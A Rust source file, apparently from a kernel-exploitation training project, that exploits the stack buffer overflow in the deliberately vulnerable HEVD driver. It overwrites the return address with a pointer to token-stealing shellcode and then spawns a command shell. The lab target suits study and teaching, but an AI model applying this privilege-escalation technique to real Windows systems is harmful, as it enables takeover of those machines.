use core::ffi::c_void;
use std::iter;

use win_kexp::shellcode::token_stealing_shellcode;
use win_kexp::util::bytes_to_hex_string;
use win_kexp::win32k::{
    allocate_shellcode, close_handle, create_cmd_process, get_device_handle, io_device_control,
    FILE_ANY_ACCESS, FILE_DEVICE_UNKNOWN, METHOD_NEITHER,
};
use win_kexp::{CTL_CODE, IOCTL};

const HEVD_IOCTL_BUFFER_OVERFLOW_STACK: u32 = IOCTL!(0x800);

fn exploit_stack_buffer_overflow_token_stealing() {
    let device_path = r"\\.\HackSysExtremeVulnerableDriver\0";

    println!("[+] Getting device handle {device_path}...");

    let h_device = get_device_handle(device_path);

    println!("[+] Successfully opened device handle.");

    println!("[+] Building payload...");
    let shellcode = token_stealing_shellcode();
    let (payload, payload_len) = unsafe { allocate_shellcode(shellcode.as_ptr(), shellcode.len()) };

    let payload_address = payload as u64;
    let bytes = bytes_to_hex_string(payload, payload_len);

    println!("\t[*] Payload address: 0x{payload_address:x}");
    println!("\t[*] Payload: 0x{bytes}");

    let ret_overwrite_offset = 0x818;

    let user_buffer: Vec<u8> = iter::repeat(0x41u8)
        .take(ret_overwrite_offset)
        .chain(payload_address.to_le_bytes().iter().cloned())
        .collect();

    println!("[+] Triggering stack buffer overflow...");

    let user_buffer_address = user_buffer.as_ptr() as *mut c_void;
    let user_buffer_address_hex = user_buffer_address as u64;
    println!("\t[*] Address of user buffer: 0x{user_buffer_address_hex:x}");

    io_device_control(
        h_device,
        HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        user_buffer_address,
        user_buffer.len().try_into().unwrap(),
        std::ptr::null_mut(),
        0,
    );

    close_handle(h_device);

    println!("[+] Successfully closed device handle.");

    let pi = create_cmd_process();

    println!("[+] Process created with ID: {}", pi.dwProcessId);
}

fn main() {
    exploit_stack_buffer_overflow_token_stealing();
}
